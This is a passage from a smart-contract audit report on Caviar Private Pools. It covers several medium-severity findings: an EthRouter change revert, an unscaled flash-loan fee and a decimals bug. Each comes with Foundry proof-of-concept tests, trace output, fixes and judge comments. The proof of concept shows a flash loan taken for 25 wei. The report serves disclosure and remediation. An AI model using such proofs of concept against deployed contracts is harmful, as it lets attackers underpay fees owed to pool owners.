class=\"mtk1\">        </span><span class=\"mtk12\">outputProof:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">MerkleMultiProof</span><span class=\"mtk1\">(</span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bytes32</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">bool</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">0</span><span class=\"mtk1\">))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">,) = </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">changeFeeQuote</span><span class=\"mtk1\">(</span><span class=\"mtk12\">inputTokenIds</span><span class=\"mtk1\">.</span><span class=\"mtk12\">length</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">//WARDEN: multiply with 10 just to make sure there really is enough</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">ethRouter</span><span class=\"mtk1\">.</span><span class=\"mtk12\">change</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">*</span><span class=\"mtk7\">10</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">changes</span><span class=\"mtk1\">, </span><span class=\"mtk7\">0</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">} </span></span></span></code></pre>\n<p>Output:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   ├─ [0] PrivatePool::change{value: 50000000000000000000}([6], [], ([], []), [], [1], [], ([], [])) </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   └─ ← &quot;EvmError: OutOfFund&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   └─ ← &quot;EvmError: Revert&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    └─ ← &quot;EvmError: Revert&quot;</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Only send the required change fee and not <code>msg.value</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/873#issuecomment-1519889954\">outdoteth (Caviar) confirmed and mitigated</a>:</strong></p>\n<blockquote>\n<p>Fixed in: <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/5\">https://github.com/outdoteth/caviar-private-pools/pull/5</a></p>\n<p>The proposed fix is to add a <code>baseTokenAmount</code> field in the Change struct and to use this field instead of msg.value when making the change operation.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">PrivatePool</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">pool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">change</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">_change</span><span class=\"mtk1\">.</span><span class=\"mtk12\">baseTokenAmount</span><span class=\"mtk1\">}(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk3\">// -- snip --</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">);</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/873#issuecomment-1527397366\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown how, because <code>msg.value</code> is passed in a loop, to functions that could reduce <code>this.balance</code>, the tx can revert, breaking the functionality for those use cases.</p>\n<p>Because that doesn’t cause a loss of principal, but shows a broken functionality for some cases, I agree with Medium Severity.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-03-flash-loan-fee-is-incorrect-in-private-pool-contract\" style=\"position:relative;\"><a href=\"#m-03-flash-loan-fee-is-incorrect-in-private-pool-contract\" aria-label=\"m 03 flash loan fee is incorrect in private pool contract permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/864\">[M-03] Flash loan fee is incorrect in Private Pool contract</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/864\">adriro</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/974\">GT_Blockchain</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/961\">Josiah</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/950\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/922\">anodaram</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/877\">KrisApostolov</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/867\">minhtrng</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/840\">rbserver</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/774\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/678\">wintermute</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/632\">jpserrat</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/551\">0xRobocop</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/521\">0xNorman</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/503\">aviggiano</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/477\">shaka</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/459\">Voyvoda</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/369\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/309\">RaymondFam</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/261\">ElKu</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/243\">sashik_eth</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/228\">ToonVH</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/130\">SpicyMeatball</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/102\">climber2002</a></em></p>\n<p>Private Pools support NFT borrowing using flash loans. Users that decide to use this feature have to pay a flash loan fee to the owner of the pool.</p>\n<p>The contract has a <code>changeFee</code> variable that is used to configure the fee for changing NFTs, and this variable is also used to determine the fee for flash loans. In the case of a change operation, the value is interpreted as an amount with 4 decimals, and the token is the base token of the pool. This means that, for example, if the base token is ETH, a <code>changeFee</code> value of 25 should be interpreted as a fee of 0.0025 ETH for change operation.</p>\n<p>However, as we can see in this following snippet, the <code>flashFee</code> function just returns the value of <code>changeFee</code> without any scaling or modification.</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L750-L752\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L750-L752</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"22\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">750</span><span class=\"mtk1\">:     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">flashFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">751</span><span class=\"mtk1\">:         </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">752</span><span class=\"mtk1\">:     }</span></span></span></code></pre>\n<p>This means that, following the previous example, a <code>changeFee</code> value of 25 will result in 0.0025 ETH for change operation, but <strong>just 25 wei for flash loans</strong>.</p>\n<p>The <a href=\"https://docs.caviar.sh/technical-reference/custom-pools/smart-contract-api/privatepool#changefee\">documentation</a> hints that this value should also be scaled to 4 decimals in the case of the flash loan fee, but in any case this is clearly an incorrect setting of the flash loan fee.</p>\n<h3 id=\"proof-of-concept-4\" style=\"position:relative;\"><a href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>In the following test, the pool is configured with a <code>changeFee</code> value of 25, and Alice is able to execute a flash loan by just paying 25 wei.</p>\n<p>Note: the snippet shows only the relevant code for the test. Full test file can be found <a href=\"https://gist.github.com/romeroadrian/06238839330315780b90d9202042ea0f\">here</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"23\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">test_PrivatePool_flashLoan_IncorrectFee</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Setup pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">PrivatePool</span><span class=\"mtk1\"> </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">PrivatePool</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">royaltyRegistry</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stolenNftOracle</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint56</span><span class=\"mtk1\"> </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">25</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">initialize</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// address _baseToken,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// address _nft,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">100e18</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint128 _virtualBaseTokenReserves,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">10e18</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint128 _virtualNftReserves,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint56 _changeFee,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// uint16 _feeRate,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk3\">// bytes32 _merkleRoot,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span><span class=\"mtk1\">, </span><span class=\"mtk3\">// bool _useStolenNftOracle,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">false</span><span class=\"mtk1\"> </span><span class=\"mtk3\">// bool _payRoyalties</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">milady</span><span class=\"mtk1\">.</span><span class=\"mtk11\">mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Alice executes a flash loan</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">startPrank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">FlashLoanBorrower</span><span class=\"mtk1\"> </span><span class=\"mtk12\">flashLoanBorrower</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">FlashLoanBorrower</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// Alice just sends 25 wei!</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">deal</span><span class=\"mtk1\">(</span><span class=\"mtk12\">alice</span><span class=\"mtk1\">, </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">privatePool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">flashLoan</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">}(</span><span class=\"mtk12\">flashLoanBorrower</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">milady</span><span class=\"mtk1\">), </span><span class=\"mtk12\">tokenId</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>The <code>flashFee</code> function should properly scale the value of the <code>changeFee</code> variable, similar to how it is implemented in <code>changeFeeQuote</code>.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/864#issuecomment-1519901128\">outdoteth (Caviar) confirmed and mitigated</a>:</strong></p>\n<blockquote>\n<p>Fixed in: <a href=\"https://github.com/outdoteth/caviar-private-pools/pull/6\">https://github.com/outdoteth/caviar-private-pools/pull/6</a></p>\n<p>Proposed fix is to exponentiate the changeFee to get the correct flashFee in the same way that changeFee is exponentiated in change().</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">flashFee</span><span class=\"mtk1\">(</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">// multiply the changeFee to get the fee per NFT (4 decimals of accuracy)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\"> == </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">) ? </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk7\">4</span><span class=\"mtk1\"> : </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk12\">baseToken</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">() - </span><span class=\"mtk7\">4</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feePerNft</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk12\">exponent</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feePerNft</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/864#issuecomment-1527242637\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>First of all FlashLoan Fees don’t have to scale.</p>\n<p>That said, the code and the codebase point to wanting to offer a fee that scales based on the amounts loaned. For this nuanced reason, given that the Sponsor has confirmed and mitigated with a scaling fee, I believe that the most appropriate severity is Medium.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-04-changefeequote-will-fail-for-low-decimal-erc20-tokens\" style=\"position:relative;\"><a href=\"#m-04-changefeequote-will-fail-for-low-decimal-erc20-tokens\" aria-label=\"m 04 changefeequote will fail for low decimal erc20 tokens permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/858\">[M-04] <code>changeFeeQuote</code> will fail for low decimal ERC20 tokens</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/858\">adriro</a>, also found by <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/994\">ToonVH</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/983\">saian</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/975\">0x5rings</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/959\">joestakey</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/886\">anodaram</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/773\">giovannidisiena</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/747\">chaduke</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/711\">Koolex</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/579\">cryptonue</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/546\">0x5rings</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/501\">aviggiano</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/487\">T1MOH</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/473\">shaka</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/434\">0xLanterns</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/345\">ayden</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/340\">ElKu</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/335\">0xbepresent</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/296\">0x4non</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/292\">Brenzee</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/219\">ck</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/161\">0xWeiss</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/139\">indijanc</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/131\">Naubit</a>, <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/111\">yixxas</a>, and <a href=\"https://github.com/code-423n4/2023-04-caviar-findings/issues/104\">Kek</a></em></p>\n<p>Private pools have a “change” fee setting that is used to charge fees when a change is executed in the pool (user swaps tokens for some tokens in the pool). This setting is controlled by the <code>changeFee</code> variable, which is intended to be defined using 4 decimals of precision:</p>\n<p><a href=\"https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L87-L88\">https://github.com/code-423n4/2023-04-caviar/blob/main/src/PrivatePool.sol#L87-L88</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">87</span><span class=\"mtk1\">:     </span><span class=\"mtk3\">/// @notice The change/flash fee to 4 decimals of precision. For example, 0.0025 ETH = 25. 500 USDC = 5_000_000.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">88</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">uint56</span><span class=\"mtk1\"> </span><span class=\"mtk12\">public</span><span class=\"mtk1\"> </span><span class=\"mtk12\">changeFee</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>As the comment says, in the case of ETH a value of 25 should represent 0.0025 ETH. In the case of an ERC20 this should be scaled accordingly based on the number of decimals of the token. The implementation is defined in the <code>changeFeeQuote</code> function.</p>\n<p><a 